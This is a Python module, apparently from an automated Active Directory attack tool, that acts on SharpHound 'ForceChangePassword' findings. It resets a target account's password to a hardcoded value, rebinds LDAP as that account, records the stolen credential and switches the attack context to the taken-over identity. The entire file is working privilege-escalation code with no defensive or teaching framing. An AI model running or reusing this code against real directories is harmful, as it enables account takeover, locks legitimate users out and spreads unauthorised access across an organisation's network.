"""Handlers for destructive SharpHound edges such as password reset."""

import logging

from .shared import PrivescActions


class DestructiveModule:
    def __init__(self, engine):
        self.engine = engine
        self.actions = PrivescActions(engine)

    # ForceChangePassword is destructive privilege abuse.
    def execute(self, rel, context) -> bool:
        target_dn = rel.end_node.get("distinguishedname")
        target_name = rel.end_node.get("name") or target_dn

        if not target_dn:
            target_dn = self.actions.resolve_distinguished_name(target_name)
        if not target_dn:
            logging.error("DESTRUCTIVE: could not resolve distinguishedname for target node.")
            return False

        new_password = "ViperStrike2026!"
        success = self.actions.force_change_password(target_dn, new_password)
        if not success:
            return False

        if not self.engine.conn.rebind(user=target_dn, password=new_password):
            logging.error(f"DESTRUCTIVE: rebind failed after password reset for {target_name}.")
            return False

        context.add_credential(target_dn, "password", new_password)
        if not context.switch_identity(target_dn):
            logging.error(f"DESTRUCTIVE: context switch failed after password reset for {target_name}.")
            return False

        logging.info(f"DESTRUCTIVE: password reset complete for {target_name}.")
        return True
